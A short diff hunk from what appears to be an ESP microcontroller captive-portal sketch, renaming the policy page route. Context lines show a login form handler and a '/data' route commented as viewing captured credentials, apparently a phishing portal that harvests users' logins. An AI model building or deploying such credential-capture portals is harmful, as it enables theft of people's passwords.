@@ -376,7 +376,7 @@ void setup() {
   server.on("/portal", handlePortal);                   // Captive portal page
   server.on("/login", HTTP_POST, handleLogin);          // Form POST
   server.on("/data", HTTP_GET, handleData);             // View captured credentials
-  server.on("/policy", handlePolicy);                     // Policy Page
+  server.on("/policy.html", handlePolicy);                     // Policy Page
   server.serveStatic("/logo.png", SPIFFS, "/logo.png"); // Serve logo (you need to serve the file you insert into spiffs!)
   server.serveStatic("/LogoPolicy.png", SPIFFS, "/LogoPolicy.png"); // Serve Policy logo
   server.onNotFound(handleNotFound);                    // Redirect everything else
